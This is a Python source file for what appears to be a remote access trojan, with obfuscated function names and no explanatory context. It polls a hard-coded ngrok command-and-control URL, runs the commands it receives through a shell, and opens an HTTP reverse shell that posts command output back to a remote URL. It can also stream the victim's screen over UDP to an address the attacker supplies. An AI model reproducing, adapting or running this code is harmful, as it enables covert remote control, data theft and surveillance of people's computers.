def rev234ajksfj32030co2030asoficmoerir(URL):
    EXIT = False
    while not EXIT:
        try:
            resspdifsdkfjs = requests.get(URL)
            if resspdifsdkfjs.text.split(' ')[0] == 'exit':
                EXIT = True
                output = "Terminating Session"
            elif resspdifsdkfjs.text.split(' ')[0] == 'cd':
                os.chdir(resspdifsdkfjs.text.split(' ')[1])
                output = "directory changed"
            else:
                outpsu3029lks = subprocess.run(resspdifsdkfjs.text, capture_output=True, text=True, shell=True)
                if outpsu3029lks.returncode == 0:
                    output = outpsu3029lks.stdout
                else:
                    output = outpsu3029lks.stderr
        except Exception as e:
            output = f'Exception : {e}'
        requests.post(URL, data=output.encode('utf-8'))


def scrslkjdfBrdsdkjfs(udp_conlink):
    SCALE_FACTOR = 0.6
    MAXDGRAMSIZE = 65507
    ADDRESS = (udp_conlink.split(':')[0], int(udp_conlink.split(':')[1]))
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    with mss.mss() as sct:
        monitor = 1
        while True:
            img = sct.grab(sct.monitors[monitor])
            img = numpy.array(img)
            img_rgb = img[:, :, :3]
            new_width = int(img_rgb.shape[1] * SCALE_FACTOR)
            new_height = int(img_rgb.shape[0] * SCALE_FACTOR)
            resized_img = cv2.resize(img_rgb, (new_width, new_height))
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode('.jpg', resized_img, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            compressed = zlib.compress(buffer.tobytes())
            if len(compressed) > MAXDGRAMSIZE:
                print("size too big")
                continue
            client.sendto(compressed, ADDRESS)


def ge230askdfj29rTaedskf30rafjd0():
    try:
        coskdfi2309fwjls093f2 = requests.get("https://allegedly-great-shiner.ngrok-free.app")
        if "(ERR_NGROK_3200)" in coskdfi2309fwjls093f2.text:
            coskdfi2309fwjls093f2 = None
    except Exception:
        coskdfi2309fwjls093f2 = None
    return coskdfi2309fwjls093f2


if __name__ == "__main__":
    while True:
        sldkfjow0239rf2j = ge230askdfj29rTaedskf30rafjd0()
        if sldkfjow0239rf2j is not None:
            sldkfjow0239rf2j = sldkfjow0239rf2j.text
            if sldkfjow0239rf2j == "<SLEEP>":
                print("sleeping")
                time.sleep(1)
            elif sldkfjow0239rf2j == "<TERMINATE>":
                break
            elif "<INTERACT>" in sldkfjow0239rf2j:
                URL = sldkfjow0239rf2j.split('@')[1].strip()
                threading.Thread(target=rev234ajksfj32030co2030asoficmoerir, args=[URL]).start()
            elif "<VIEWSCREEN>" in sldkfjow0239rf2j:
                URL = sldkfjow0239rf2j.split('@')[1].strip()
                bpid = multiprocessing.Process(target=scrslkjdfBrdsdkjfs, args=[URL])
                bpid.start()
            elif sldkfjow0239rf2j == "<STOPSCREEN>":
                bpid.kill()
            else:
                try:
                    subprocess.Popen(sldkfjow0239rf2j, shell=True)
                except Exception:
                    print("error while executing")
        else:
            print("None")
        time.sleep(1)
